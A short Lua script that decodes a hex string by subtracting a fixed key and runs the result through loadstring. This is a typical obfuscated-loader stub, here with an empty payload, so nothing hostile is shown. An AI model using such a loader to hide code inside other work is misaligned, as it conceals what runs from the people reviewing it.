local key = 59
local hex = ""
local decrypted = {}
local idx = 1
for cc in hex:gmatch("..") do
    local val = tonumber(cc, 16) - key
    if val < 0 then val = val + 256 end
    decrypted[idx] = string.char(val)
    idx = idx + 1
end
local fn, err = loadstring(table.concat(decrypted))
if fn then
    fn()
else
    error("Execution failed: " .. tostring(err))
end
